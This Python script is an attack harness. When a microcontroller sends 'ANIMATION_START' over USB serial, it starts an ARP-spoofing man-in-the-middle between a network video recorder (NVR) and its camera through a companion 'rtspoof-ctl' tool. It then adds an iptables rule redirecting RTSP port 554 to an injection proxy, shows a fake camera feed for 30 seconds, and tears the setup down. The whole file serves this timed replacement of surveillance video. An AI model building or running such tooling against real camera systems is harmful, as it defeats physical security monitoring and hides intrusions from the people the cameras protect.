#!/usr/bin/env python3
"""Run on_animation_started() for each complete ANIMATION_START USB serial line."""
import argparse
import atexit
import configparser
import subprocess
import sys
import threading
from pathlib import Path


EVENT = b"ANIMATION_START"

# Reuse the Trigger CLI. `attack` brings up the whole MITM — ip_forward on,
# arpspoof poisoning the NVR⇄camera pair, and the inject proxy; `panic` tears
# it all back down and restores ip_forward. The script lives in RE/, the CLI
# (and its config.ini with the NVR/camera IPs) in Trigger/.
_CTL = Path(__file__).resolve().parent.parent / "Trigger" / "rtspoof-ctl"
_CONFIG = _CTL.parent / "config.ini"

# The proxy listens on PROXY_PORT; the NVR sends RTSP to RTSP_PORT. While
# spoofing we NAT-redirect the NVR's traffic to the proxy, then remove the
# rule so it forwards straight to the real camera again. Keep PROXY_PORT in
# sync with [proxy].listen_port in Trigger/config.ini. (Needs root.)
RTSP_PORT = 554
PROXY_PORT = 5540
_redirect_added = False

# How long the fake feed should be *visible*. The actual hold adds the
# proxy's inject_delay warm-up on top (see _hold_seconds), so the injected
# stream is on screen for this many seconds before we restore.
SPOOF_SECONDS = 30

# One cycle at a time: a second ANIMATION_START while the feed is already
# spoofed is ignored rather than stacking timers / restarting the proxy.
# _abort cuts the hold short (set on exit) so teardown is immediate.
_cycle_lock = threading.Lock()
_cycle_active = False
_abort = threading.Event()


def _run_ctl(*args):
    """Invoke `rtspoof-ctl <args>`; return its exit code (nonzero on failure)."""
    try:
        return subprocess.run([sys.executable, str(_CTL), *args],
                              check=False).returncode
    except OSError as error:
        print(f"rtspoof-ctl {' '.join(args)} failed: {error}", file=sys.stderr,
              flush=True)
        return 1


def _iptables_redirect(add):
    """Add/remove the PREROUTING rule that sends NVR RTSP to the proxy.

    iptables -t nat {-A|-D} PREROUTING -p tcp --dport 554 \\
             -j REDIRECT --to-port 5540

    Idempotent via _redirect_added, so a failed spoof won't leave a dangling
    rule and we never issue a spurious delete.
    """
    global _redirect_added
    if add == _redirect_added:
        return
    action = "-A" if add else "-D"
    cmd = ["iptables", "-t", "nat", action, "PREROUTING",
           "-p", "tcp", "--dport", str(RTSP_PORT),
           "-j", "REDIRECT", "--to-port", str(PROXY_PORT)]
    print(f"   iptables {action} PREROUTING 554 -> {PROXY_PORT}", flush=True)
    try:
        result = subprocess.run(cmd, check=False)
        if result.returncode == 0:
            _redirect_added = add
        else:
            print(f"   iptables {action} returned {result.returncode} "
                  "(need root?)", file=sys.stderr, flush=True)
    except OSError as error:
        print(f"iptables {action} failed: {error}", file=sys.stderr, flush=True)


def _hold_seconds():
    """Total hold = proxy warm-up (inject_delay) + the visible SPOOF_SECONDS.

    Injection doesn't start until the proxy's inject_delay has elapsed, so to
    keep the fake feed on screen for a full SPOOF_SECONDS we wait that warm-up
    out first. Reads [proxy].inject_delay from the Trigger config (proxy
    default 3.0 if unset/unreadable)."""
    warmup = 3.0
    try:
        cp = configparser.ConfigParser()
        cp.read(_CONFIG)
        warmup = cp.getfloat("proxy", "inject_delay", fallback=3.0)
    except (configparser.Error, ValueError, OSError):
        pass
    return warmup, warmup + SPOOF_SECONDS


def _spoof_cycle():
    """attack → redirect → hold (inject_delay + SPOOF_SECONDS) → redirect off → panic.

    Runs on a background thread so the serial loop keeps reading. The hold is
    an interruptible wait, so exit (or any _abort) tears down at once instead
    of blocking for the rest of the window.
    """
    global _cycle_active
    warmup, hold = _hold_seconds()
    try:
        print(f"-> attack (arpspoof + inject): {warmup:g}s warm-up + "
              f"{SPOOF_SECONDS}s visible = {hold:g}s", flush=True)
        if _run_ctl("attack") == 0:        # MITM up (arpspoof + proxy on PROXY_PORT)
            _iptables_redirect(add=True)   # then send the NVR to the proxy
            _abort.wait(hold)              # warm-up + visible window (interruptible)
        else:
            print("   attack failed (need root?) - tearing down", file=sys.stderr,
                  flush=True)
    finally:
        print("-> back to normal", flush=True)
        _iptables_redirect(add=False)      # stop redirecting before killing proxy
        _run_ctl("panic")                  # arpspoof off + proxy off + ip_forward back
        with _cycle_lock:
            _cycle_active = False


def on_animation_started():
    """On each ANIMATION_START: full MITM for SPOOF_SECONDS, then auto-restore.

    Sequence:
        rtspoof-ctl attack      (ip_forward on + arpspoof pair + inject proxy)
        iptables redirect 554 → PROXY_PORT
        hold inject_delay + SPOOF_SECONDS   (warm-up + visible window)
        iptables redirect off
        rtspoof-ctl panic       (proxy off + arpspoof off + ip_forward restored)

    The work runs on a daemon thread so the serial loop stays responsive; a
    repeat trigger during the window is ignored, and an atexit hook restores
    the host if the listener is killed mid-cycle.
    """
    global _cycle_active
    with _cycle_lock:
        if _cycle_active:
            print("already spoofing - ignoring re-trigger", flush=True)
            return
        _cycle_active = True
    _abort.clear()
    threading.Thread(target=_spoof_cycle, daemon=True).start()


@atexit.register
def _restore_on_exit():
    """Best-effort: never leave a redirect, arpspoof, or the proxy up after we quit."""
    if _cycle_active or _redirect_added:
        print("exiting mid-cycle - restoring", flush=True)
        _abort.set()               # cut the hold so the worker stops waiting
        _iptables_redirect(add=False)
        _run_ctl("panic")


class LineDecoder:
    """Retain partial lines across serial timeouts; discard oversized noise."""

    def __init__(self):
        self.buffer = bytearray()
        self.discarding = False

    def feed(self, chunk):
        events = 0
        for byte in chunk:
            if byte == 10:  # LF
                if not self.discarding and bytes(self.buffer).rstrip(b"\r") == EVENT:
                    events += 1
                self.buffer.clear()
                self.discarding = False
            elif not self.discarding:
                if len(self.buffer) >= 256:
                    self.buffer.clear()
                    self.discarding = True
                else:
                    self.buffer.append(byte)
        return events


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--port", help="COM5, /dev/ttyACM0, /dev/cu.usbmodem..., etc.")
    parser.add_argument("--list", action="store_true", help="List serial ports and exit")
    args = parser.parse_args()
    try:
        import serial
        from serial.tools import list_ports
    except ImportError:
        parser.exit(1, "Install pySerial: python -m pip install pyserial\n")

    if args.list:
        ports = list(list_ports.comports())
        for port in ports:
            print(f"{port.device}: {port.description}")
        if not ports:
            print("No serial ports found.")
        return 0
    if not args.port:
        parser.error("use --port PORT or --list")

    try:
        # Configure control lines before opening. Native USB firmware requires
        # DTR asserted for its Serial connection; RTS stays deasserted.
        connection = serial.Serial(port=None, baudrate=115200, timeout=0.25,
                                   rtscts=False, dsrdtr=False)
        connection.dtr = True
        connection.rts = False
        connection.port = args.port
        with connection:
            # Deliberately do not clear the receive buffer: a new press could
            # arrive immediately after opening. No background replay is provided.
            decoder = LineDecoder()
            print(f"Listening on {args.port}. Press Ctrl+C to stop.", flush=True)
            while True:
                chunk = connection.read(min(connection.in_waiting or 1, 4096))
                for _ in range(decoder.feed(chunk)):
                    print("Animation started", flush=True)
                    on_animation_started()
    except KeyboardInterrupt:
        print("\nStopped.")
        return 0
    except (serial.SerialException, OSError) as error:
        print(f"Serial error: {error}\nClose Arduino Serial Monitor, check the port, "
              "then run this script again.", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
